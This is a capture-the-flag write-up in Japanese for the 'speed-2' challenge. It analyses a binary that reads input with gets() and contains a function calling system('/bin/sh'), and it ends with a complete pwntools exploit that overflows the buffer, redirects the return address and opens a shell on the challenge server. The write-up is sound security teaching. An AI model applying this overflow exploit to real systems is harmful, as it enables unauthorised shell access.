# speed-2

## / Overview

リターンアドレス書き換え

## / Writeup

まずは配布ファイルのタイプを調べます。

```sh
$ file speed2-7793659ab59fdba19a36c0fbbb75258b
speed2-7793659ab59fdba19a36c0fbbb75258b: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8dc8016b7a05134085c7ed625334b3249835c04e, for GNU/Linux 3.2.0, stripped
```

普通のELFファイルなのでGhidraに入れます。

メイン関数はとてもシンプルで一回入力を受け付けて終了です。

```c
undefined8 FUN_00401200(void)

{
  char local_28 [32];
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  FUN_004011eb();
  printf("b0fz: ");
  gets(local_28);
  return 0;
}
```

リターンアドレスにROPチェーンを組もうかと考えたのですが、シンボルツリーを見ると`/bin/sh`を呼び出す関数がおいてありました。これを`win()`とでも呼びましょう。アドレスは`0x4011d6`です。

```c
void FUN_004011d6(void)

{
  system("/bin/sh");
  return;
}
```

これをリターンアドレスに置きたいのでオフセットを探します。関数名は`stripped`で消されていますが、`FUN_00401200`がメインなので`0x401200`から`ret`までをディスアセンブルします。

```nasm
(gdb) disas 0x401200, 0x401290
0x0000000000401200:  endbr64
   0x0000000000401204:  push   rbp
   0x0000000000401205:  mov    rbp,rsp
   0x0000000000401208:  sub    rsp,0x20
   0x000000000040120c:  mov    rax,QWORD PTR [rip+0x2e3d]        # 0x404050 <stdin>
   0x0000000000401213:  mov    ecx,0x0
   0x0000000000401218:  mov    edx,0x2
   0x000000000040121d:  mov    esi,0x0
   0x0000000000401222:  mov    rdi,rax
   0x0000000000401225:  call   0x4010e0 <setvbuf@plt>
   0x000000000040122a:  mov    rax,QWORD PTR [rip+0x2e0f]        # 0x404040 <stdout>
   0x0000000000401231:  mov    ecx,0x0
   0x0000000000401236:  mov    edx,0x2
   0x000000000040123b:  mov    esi,0x0
   0x0000000000401240:  mov    rdi,rax
   0x0000000000401243:  call   0x4010e0 <setvbuf@plt>
   0x0000000000401248:  mov    edi,0x3c
   0x000000000040124d:  call   0x4010c0 <alarm@plt>
   0x0000000000401252:  mov    eax,0x0
   0x0000000000401257:  call   0x4011eb
   0x000000000040125c:  mov    edi,0x402a3d
   0x0000000000401261:  mov    eax,0x0
   0x0000000000401266:  call   0x4010b0 <printf@plt>
   0x000000000040126b:  lea    rax,[rbp-0x20]
   0x000000000040126f:  mov    rdi,rax
   0x0000000000401272:  mov    eax,0x0
   0x0000000000401277:  call   0x4010d0 <gets@plt>
   0x000000000040127c:  mov    eax,0x0
   0x0000000000401281:  leave
   0x0000000000401282:  ret
   0x0000000000401283:  add    bl,dh
   0x0000000000401285:  nop    edx
   0x0000000000401288:  sub    rsp,0x8
   0x000000000040128c:  add    rsp,0x8
   0x0000000000401290:  ret
```
`0x40126b`を見ると、`rbp-0x20`から書き込まれているので、オフセットは`0x28`バイトです。念のためセキュリティ機構もチェックしときます。

```sh
$ checksec  speed2-7793659ab59fdba19a36c0fbbb75258b
[*] '/home/wsl1/ctf/Midnight_Sun_CTF/speed2/speed2-7793659ab59fdba19a36c0fbbb75258b'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
```

カナリアがないので簡単に以下のようなリターンアドレスの書き換えが行なえます。

```py
from pwn import *

exe = './speed2-7793659ab59fdba19a36c0fbbb75258b'
elf = ELF(exe)

p = remote('speed2.play.ctf.se', 6161)

ret_gadget = 0x40101a
win_addr = 0x4011d6

payload = b"A" * 40
payload += p64(ret_gadget)
payload += p64(win_addr)

p.sendline(payload)

p.interactive()
```
